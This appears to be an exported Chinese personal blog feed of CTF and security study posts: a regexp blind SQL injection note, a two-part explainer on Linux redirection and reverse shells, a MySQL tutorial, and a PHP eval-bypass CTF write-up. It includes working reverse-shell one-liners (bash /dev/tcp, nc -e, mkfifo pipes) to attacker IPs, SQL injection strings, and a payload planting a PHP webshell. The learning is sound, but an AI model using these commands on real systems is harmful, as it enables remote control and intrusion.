<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225154444.png" alt="img" style="zoom:67%;">
这个看起来就像是MD5加密，解密一下得到:adminqwe123666

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225154710.png" alt="img" style="zoom:67%;">
登录后得到这个信息，看起来像是git？ 猜测是源码泄露，工具扫描一下
之前用的都是githack可能是我版本没更新一直没看下载完全

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225161351.png" alt="img" style="zoom:67%;">
于是我换了一个git_extract，也不行？？只有一个flag.php，问题出在哪了吗，看了一下wp发现也是这样写的呀，于是就直接去看了一下别人的题解，发现下载到那个文件以后，访问就可以看到flag了

<h3 id="REGEXP盲注语法"><a href="#REGEXP盲注语法" class="headerlink" title="REGEXP盲注语法:"></a>REGEXP盲注语法:</h3><p><strong>注入原理</strong><br>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。<br>应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210225161734.png" alt="img" style="zoom:67%;"></p>
<p><code>^</code>表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0（<br>2）regexp关键字还可以代替where条件里的=号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where password regexp &#39;^ad&#39;;</span><br></pre></td></tr></table></figure>

<p>使用场景：</p>
<blockquote>
<p>过滤了=、in、like</p>
</blockquote>
<p><code>^</code>若被过滤，可使用<code>$</code>来从后往前进行匹配</p>
<p>常用regexp正则语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regexp &#39;^[a-z]&#39;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#39;^r&#39;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中</span><br></pre></td></tr></table></figure>

<p>（3）在联合查询中的使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 union select 1,database() regexp &#39;^s&#39;,3--+</span><br></pre></td></tr></table></figure>

<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>2.判断数据库名</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; or database() regexp &#39;^s&#39;--+ 正常</span><br><span class="line">&#39; or database() regexp &#39;y$&#39;--+ 正常</span><br></pre></td></tr></table></figure>

<p>和上面的like差不多不过通配符不太一样</p>
]]></content>
  </entry>
  <entry>
    <title>linux反弹shell的本质(二)</title>
    <url>/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><h4 id="shell是什么"><a href="#shell是什么" class="headerlink" title="shell是什么"></a>shell是什么</h4><p>shell可以理解为就是一个可以输入命令的窗口，即命令行窗口               <a id="more"></a></p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转.</p>
<h2 id="反弹shell的本质"><a href="#反弹shell的本质" class="headerlink" title="反弹shell的本质:"></a>反弹shell的本质:</h2><p><strong>文字描述:</strong><br>攻击端为attacker，被攻击端为victim<br>attacker和victim在某一端口实现互联，我们之前说过linux中一切皆文件，所以可以理解是，attacker的输入重定向至victim的输入，victim的输出重定向至attacker构成了这样一个回路<br>接下来我们来分解这一过程:</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>attacker ip：192.168.11.128<br>victim ip: </p>
<p>首先在attacker上监听：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>

<p>在victim上执行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204170702.png" alt="img" style="zoom:67%;">
接下来就可以看到在我们的attacker上实现了弹出了victim的shell。<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204171106.png" alt="img" style="zoom:67%;">
并且可以在此执行命令，获得victim上的内容

<h4 id="剖析命令"><a href="#剖析命令" class="headerlink" title="剖析命令"></a>剖析命令</h4><p><strong>1.bash -i</strong></p>
<p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
<p>2）-i 这个参数表示的是产生交互式的shell</p>
<p><strong>2./dev/tcp/ip/port</strong></p>
<p><strong>/dev/tcp|udp/ip/port</strong> 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，如下图：</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180810173607-cf021f9e-9c80-1.png"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204171035.png" alt="img"></a></p>
<p>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
<h4 id="交互重定向——分解交互过程"><a href="#交互重定向——分解交互过程" class="headerlink" title="交互重定向——分解交互过程"></a>交互重定向——分解交互过程</h4><h5 id="1实现victim上的输入输出至attacker中（victim输出重定向）"><a href="#1实现victim上的输入输出至attacker中（victim输出重定向）" class="headerlink" title="1实现victim上的输入输出至attacker中（victim输出重定向）"></a>1实现victim上的输入输出至attacker中（victim输出重定向）</h5><p>在attacker上输入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp port</span><br></pre></td></tr></table></figure>

<p>在victim上输入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base -i &gt; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port</span><br></pre></td></tr></table></figure>

<p>此时 在victim上的输入，会输出至attacker 但是 attacker却无法对victim进行干扰<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204175222.png" alt="img" style="zoom:67%;"></p>
<h5 id><a href="#" class="headerlink" title></a><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204175235.png" alt="img" style="zoom: 50%;"></h5><h5 id="2-实现attacker上的输入至victim（victim输入重定向）"><a href="#2-实现attacker上的输入至victim（victim输入重定向）" class="headerlink" title="2.实现attacker上的输入至victim（victim输入重定向）"></a>2.实现attacker上的输入至victim（victim输入重定向）</h5><p>在victim上输入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &lt; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.128&#x2F;2333</span><br></pre></td></tr></table></figure>

<p>在attacker上输入的内容就会被重定向至victim中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204181449.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204181443.png" alt="img" style="zoom:67%;"></p>
<h5 id="3-结合以上两条指令"><a href="#3-结合以上两条指令" class="headerlink" title="3.结合以上两条指令"></a>3.结合以上两条指令</h5><p>在victim上输入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.128&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>我们从左到右分析，此时victim的输出重定向至attacker，接下来是0&gt;&amp;1,即将attacker的输入重定向输出到victim的输入，而之前我们说了，victim的输入会重定向输出至attacker，可能有点绕，把这个想象成一个回路</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204184458.png" alt="img" style="zoom:67%;">
但是，我们在victim上仍然可以看到我们在attacker输入的命令，为什么呢？因为attacker的输入重定向输出到了victim，接下来victim才会根据这个输入执行输出结果
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204183721.png" alt="img" style="zoom:67%;">

<p>该如何解决呢？<br>使用 :<strong>&gt;&amp;word= &gt; word 2&gt;&amp;1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.11.128&#x2F;2333 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>

<p>解析：从victim的标准输出以及标准错误输出都重定向到了attacker，而attacker的输入又重定向输入至victim，此时victim接收到了我们从attacker上的标准输入，执行命令标准输出至attacker，但由于标准错误输出也重定向到了attacker，所以在victim上就看不到我们的命令了。有点绕，还是想象成一个环，只不过刚才的数据环运作过程中，有一个信息停滞没走。</p>
<h2 id="常见的反弹shell语句"><a href="#常见的反弹shell语句" class="headerlink" title="常见的反弹shell语句"></a>常见的反弹shell语句</h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure>

<p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别（我在上面给出链接的文章中也特地用加粗的形式解释了）</p>
<h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 &lt;&amp;2</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>

<p>这里再谈谈理解，首先victim的标准输出以及标准错误输出至attacker输出，而attacker的标准输入至victim的标准错误输出上，而victim的标准错误输出边如前面所说的有attacker输出。</p>
<h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>

<p><strong>简单的解释一下：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333</span><br></pre></td></tr></table></figure>

<p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command|while read line do .....done</span><br></pre></td></tr></table></figure>

<p>这个是一个非常经典的句子，它的原句是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">       …</span><br><span class="line">done &lt; file</span><br></pre></td></tr></table></figure>

<p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p>
<p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
<p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;attackerip&#x2F;4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>

<h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;sh 192.168.146.129 2333</span><br></pre></td></tr></table></figure>

<p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>

<p><strong>简单的解释：</strong></p>
<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
<p>类似的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过这两天的学习，感觉对于linux反弹shell终于有了一些更深的理解，感觉对于之前的cat /&gt;flag等的理解都变深了一些，尤其是之间的交互作用的原理de理解</p>
<p>参考:<a href="https://xz.aliyun.com/t/2549#toc-4">https://xz.aliyun.com/t/2549#toc-4</a></p>
]]></content>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>linux反弹shell的本质(一)</title>
    <url>/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/</url>
    <content><![CDATA[<h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p>
<p>当Linux启动的时候会默认打开三个文件描述符，分别是：<a id="more"></a></p>
<p>标准输入standard input <strong>0 **（默认设备键盘）<br>标准输出standard output **1</strong>（默认设备显示器）<br>错误输出：error output <strong>2</strong>（默认设备显示器）</p>
<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203183012.png" alt="img" style="zoom:67%;"></p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p><strong>定义</strong>：顾名思义，重定向，就是改变输入输出的方向，<strong>针对文件描述符的操作</strong><br><strong>输入方向</strong>就是数据从哪里流向程序。数据默认从键盘流向程序，如果改变了它的方向，数据就从其它地方流入，这就是输入重定向。<br><strong>输出方向</strong>就是数据从程序流向哪里。数据默认从程序流向显示器，如果改变了它的方向，数据就流向其它地方，这就是输出重定向<br><strong>符号</strong>：<br>（1）输入重定向 &lt;    &lt;&lt;<br>（2）输出重定向 &gt;    &gt;&gt;<br><strong>那么如何实现重定向依靠的就是改变文件描述符</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203184023.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203184111.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203184940.png" alt="img" style="zoom:67%;">

<p>总结一下话，就是把原本要输出的内容输出到文本中，把原本要输入的内容从文本中输入</p>
<h3 id="深入理解"><a href="#深入理解" class="headerlink" title="深入理解"></a>深入理解</h3><p>1.bash在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向<br>2.如果有多个重定向符号，遵循从左到右的的顺序，切不要随便改变顺序，会带来不一样的结果<br>3.&lt; 是对标准输入0重定向，&gt;是对标准输出1重定向</p>
<h4 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a>1.输入重定向</h4><p>格式： [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p>
<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203204000.png" alt="img" style="zoom:67%;">
![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203204231.png)
解释:解析器解析到<会先处理重定向，将标准输入重定向123.txt，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file，于是cat就从file中读取指令了， <h4 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a>2.输出重定向<p>格式： [n]&gt; word<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203204648.png" alt="img"></p>
<h4 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a>3.标准输出与标准错误输出重定向</h4><p>格式： &amp;&gt; word &gt;&amp; word<br>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于  &gt; word 2&gt;&amp;1<br>例： 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203205923.png" alt="img" style="zoom:67%;">
从上可以看出，我们执行的指令内容都会被重定向输出到123.txt，这就很符合前面所说的，重定向这一定理，原来是要直接输出到屏幕上的，被我们重定向到文件夹内

<h4 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a>4.文件描述符的复制</h4><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p>
<p>说明：</p>
<p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p>
<p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
<p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p>
<p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p>
<h4 id="5顺序不可更换实例"><a href="#5顺序不可更换实例" class="headerlink" title="5顺序不可更换实例"></a>5顺序不可更换实例</h4><p><code>cmd 2&gt;&amp;1 &gt;file</code><br>解析到 2&gt;&amp;1 根据上面，可以理解为现在储存在1这个数组中，解析到&gt;，将内容输出到file</p>
<h4 id="6-exec绑定重定向"><a href="#6-exec绑定重定向" class="headerlink" title="6.exec绑定重定向"></a>6.exec绑定重定向</h4><p>格式：exec [n] &lt;/&gt; file/[n]</p>
<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
<p>参考:<a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a><br>图片来源:<a href="http://c.biancheng.net/view/942.html">http://c.biancheng.net/view/942.html</a></p>
<h5 id="重点："><a href="#重点：" class="headerlink" title="重点："></a><strong>重点：</strong></h5><p>格式： [n]&lt;&gt;word</p>
<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>很好的体现出了Linux中一切皆文件的特性，重定向就是改变文件（在linux中也即一切数据）的输入输出流向。</p>
</会先处理重定向，将标准输入重定向123.txt，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file，于是cat就从file中读取指令了，>]]></content>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>my first time to use typro</title>
    <url>/2020/10/05/my-first-time-to-use-typro/</url>
    <content><![CDATA[<p>第一次使用typro</p>
]]></content>
      <tags>
        <tag>typro</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql增删改查</title>
    <url>/2020/10/20/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>创建数据库的方法有<br>1.create database （数据库名）；<br>2.用mysqladmin 创建数据库: mysqladmin -u root -p create (数据库名)<br>3利用PHP脚本创建数据库                     <a id="more"></a></p>
<h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><p>1.drop database （数据库名字）；</p>
<h2 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h2><p>1.利用 use（数据库名字）</p>
<h2 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h2><p><strong>1.修改数据库的输入数据类型</strong><br>格式：alter table （表名） modify （要修改的内容）<br><strong>2.增添数据库中的一个输入项</strong><br>格式：alter table  （表名）add  （要增加的内容）<br><strong>3.更改原本的数据库项目名字</strong><br>格式： alter table （表名）change column（要修改的） （修改结果）（数据类型）<br><strong>4.修改表名</strong><br>格式：alter table （原本表名） rename （现在想要的表名）<br>这两个都是属于结构设计范畴的。</p>
<h2 id="mysql的增删改查"><a href="#mysql的增删改查" class="headerlink" title="mysql的增删改查"></a>mysql的增删改查</h2><p><strong>首先是它们的语句命令</strong></p>
<p>增:insert<br>删:delete<br>改：update<br>查:SELECT或者show<br><strong>格式</strong><br>向所有字段插入：insert into 表名（字段1，字段2，字段3……）values(值1,值2，值3……)；<br>向指定字段插入:insert into 表名（指定字段集合） valuse（指定字段值）;</p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table test(id int, name varchar(40),sex varchar(4),birthday date);&#x2F;&#x2F;新建一个表</span><br><span class="line">insert into test(id,name,sex,birthday)&#x2F;&#x2F;增加数据（插入数据）</span><br><span class="line">values(1，&#39;zhangsan&#39;，&#39;male&#39;,&#39;2001-08-06&#39;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update test set sex&#x3D;female;&#x2F;&#x2F;所有员工性别更改为女性</span><br><span class="line">update test set sex &#x3D; female where name &#x3D;&#39;zhangsan&#39;;&#x2F;&#x2F;更改张三这个员工的性别</span><br></pre></td></tr></table></figure>

<p>这边说一下where这个函数的意思：where可以指定你想更换的数据行。<br><strong>删除表数据</strong><br>举例子吧：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from test where name&#x3D;&#39;zhangsan&#39;;&#x2F;&#x2F;删除表中张三的记录</span><br><span class="line">delete from test;&#x2F;&#x2F;删除表中所有的记录</span><br><span class="line">truncate table test;&#x2F;&#x2F;使用truncate删除表中记录</span><br></pre></td></tr></table></figure>

<p><strong>查询表数据</strong></p>
<p><strong>格式</strong>：select   *或者【字段名】 from 表名；<br><strong>查询所有字段和部分字段。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select id,name,sex,birthday from test;&#x2F;&#x2F;从表中获取全部数据</span><br><span class="line">select name, birthday from test;&#x2F;&#x2F;从表中获取姓名和生日的信息</span><br><span class="line">select birthday from test where sex&#x3D;male；&#x2F;&#x2F;获取性别为男性的生日</span><br><span class="line">select 数字，数字，数字，数字........;&#x2F;&#x2F;可以查询指定字段的数据</span><br><span class="line">select 要查询的字段名 from 库名.表名；</span><br><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件的字段名&#x3D;&#39;已知条件的值&#39;；</span><br><span class="line">select 要查询的字段名 from 库名.表名 where 已知条件1的字段名&#x3D;&#39;已知条件1的值&#39; and 已知条件2的字段名&#x3D;&#39;已知条件2的值&#39;</span><br></pre></td></tr></table></figure>

<p><strong>使用distinct去除重复数据</strong><br>select distinct 字段名 from 表名；<br><strong>使用limit指定查询结果的行数</strong><br>select 字段名 from drom 表名 limit  n；<br>实例<br>select *from stu limit 1;</p>
<p><strong>使用order by 对结果进行排序</strong><br>order by 字段名  ASC/DESC</p>
<p><strong>修改表数据</strong><br>语法：update 表名 set 字段1=值，字段2=值 ；<br>插入数据insert</p>
]]></content>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>nep欢乐赛</title>
    <url>/2021/03/21/nep%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little trick"></a>little trick</h2><h3 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h3><p>**``**反引号：反引号可以用来执行系统命令              <a id="more"></a><br>**&gt;**：输出重定向符号:(linux反弹shell本质博客中有讲解)<br>可以将内容重定向输出至某个位置</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210323185714.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210323185718.png" alt="img" style="zoom:67%;">





<h3 id="思路"><a href="#思路" class="headerlink" title="思路:"></a>思路:</h3><p>这里一共就三个关键函数，intval、strlen、substr、查找了前面两个的trick都对解题没有帮助，于是看了一下substr函数，可以使用-1进行倒着截断，那么此时也就绕过了len&lt;-1的限制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $nep = $_GET[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    $len = $_GET[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($len)&lt;<span class="number">8</span> &amp;&amp; strlen($nep)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($nep,<span class="number">0</span>,$len));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210322011020.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210322011027.png" alt="img" style="zoom:67%;">
接下来就是构造eval执行语句:
这里直接放payload进行分析：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?len&#x3D;-1&amp;nep&#x3D;&#96;$_GET[a]&#96;;;&amp;a&#x3D;ls&gt;1.php</span><br><span class="line">?len&#x3D;-1&amp;nep&#x3D;&#96;$_GET[a]&#96;;;&amp;a&#x3D;cat *&gt;1.php</span><br><span class="line">?len&#x3D;-1&amp;nep&#x3D;&#96;$_GET[a]&#96;;;&amp;a&#x3D;echo \&lt;\?php eval\(\$_POST\[a\]\)\;&gt;123.php&#x2F;&#x2F;学长解法</span><br></pre></td></tr></table></figure>

<p>从nep后面开始分析：<br>由于我们输入的执行的代码程度是有限制的，所以这里使用一个GET指令传参，这算是一种拼接手法。这条指令拼接完以后就变成了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`ls&gt;<span class="number">1.</span>php`</span><br><span class="line">`cat *&gt;<span class="number">1.</span>php`</span><br><span class="line">`<span class="keyword">echo</span> \&lt;\?php <span class="keyword">eval</span>\(\$_POST\[a\]\)\;&gt;<span class="number">123.</span>php`</span><br></pre></td></tr></table></figure>


<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210323192847.png" alt="img" style="zoom:67%;">


<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210323192853.png" alt="img"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210323192850.png" alt="img" style="zoom:67%;">

<p>这里我们分部分详解:</p>
<p>``加反引号，所以可以执行系统命令的echo，系统命令的echo是可以输入内容到文件中的，格式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 内容 &gt;文件名</span><br></pre></td></tr></table></figure>

<p><strong>为什么需要&gt;文件输出重定向？</strong><br>我们可以发现在这段代码中是没有echo之类的输出函数的，所以此时我们想要输出内容就需要使用输出重定向，将<strong>执行命令的结果</strong>重定向输出至其他文件中，内容才可以显现。</p>
<p><strong>为什么需要反斜杠</strong>：<br>这里的反斜杠是为了屏蔽一些字符的作用，我们知道``里面是执行了系统命令，在linux系统里面&lt; 等都是有其他意义的，如果不加反斜杠直接输入会有歧义导致输入错误</p>
<p>反引号使用详细参考参考:<a href="https://blog.csdn.net/u012005313/article/details/46241473">https://blog.csdn.net/u012005313/article/details/46241473</a></p>
